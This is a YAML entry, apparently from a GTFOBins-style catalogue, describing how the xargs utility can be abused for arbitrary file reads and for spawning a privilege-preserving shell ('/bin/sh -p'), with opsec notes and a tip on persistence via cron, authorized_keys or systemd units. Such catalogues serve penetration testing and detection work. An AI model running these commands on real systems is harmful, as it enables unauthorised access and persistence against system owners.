---
name: xargs
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: xargs -a /path/to/input-file -0
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: xargs -a /dev/null /bin/sh -p
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: xargs -a /dev/null /bin/sh -p
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: echo x | xargs -o -a /dev/null /bin/sh -p
references:
- https://gtfobins.github.io/gtfobins/xargs/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
